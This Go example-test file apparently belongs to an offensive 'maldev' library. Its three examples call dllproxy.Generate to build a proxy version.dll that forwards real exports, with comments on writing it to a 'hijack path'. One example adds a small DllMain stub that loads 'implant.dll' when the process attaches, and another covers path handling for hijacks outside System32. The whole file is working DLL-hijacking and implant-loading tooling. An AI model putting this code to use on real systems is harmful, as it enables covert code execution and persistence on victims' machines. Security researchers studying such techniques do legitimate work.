package dllproxy_test

import (
	"fmt"

	"github.com/oioio-space/maldev/pe/dllproxy"
)

// Generate emits the proxy DLL bytes for a tiny export list. In real
// use, callers obtain the export list via [pe/parse.File.Exports] on
// the legitimate target rather than hardcoding it.
func ExampleGenerate() {
	out, err := dllproxy.Generate(
		"version.dll",
		[]string{"GetFileVersionInfoSizeA", "GetFileVersionInfoA", "VerQueryValueA"},
		dllproxy.Options{},
	)
	if err != nil {
		fmt.Println("generate:", err)
		return
	}
	// out is a complete PE — write to disk at the hijack path:
	//   os.WriteFile(opp.HijackedPath, out, 0o644)
	fmt.Printf("emitted %d bytes\n", len(out))
}

// Generate_payload: Options.PayloadDLL adds a 32-byte x64 DllMain that
// LoadLibraryA's the supplied filename on DLL_PROCESS_ATTACH. The
// loader resolves the kernel32!LoadLibraryA IAT slot before the stub
// runs, so no manual import resolution is needed.
func ExampleGenerate_payload() {
	out, err := dllproxy.Generate(
		"version.dll",
		[]string{"GetFileVersionInfoSizeA"},
		dllproxy.Options{PayloadDLL: "implant.dll"},
	)
	if err != nil {
		fmt.Println("generate:", err)
		return
	}
	fmt.Printf("emitted %d bytes (forwarder + payload-loader)\n", len(out))
}

// Generate_pathScheme: PathSchemeSystem32 swaps the GLOBALROOT prefix
// for a plain `C:\Windows\System32\…` path. Use only for hijack
// opportunities outside System32 — recurses into self otherwise.
func ExampleGenerate_pathScheme() {
	_, err := dllproxy.Generate(
		"version.dll",
		[]string{"VerQueryValueW"},
		dllproxy.Options{PathScheme: dllproxy.PathSchemeSystem32},
	)
	if err != nil {
		fmt.Println("generate:", err)
	}
}
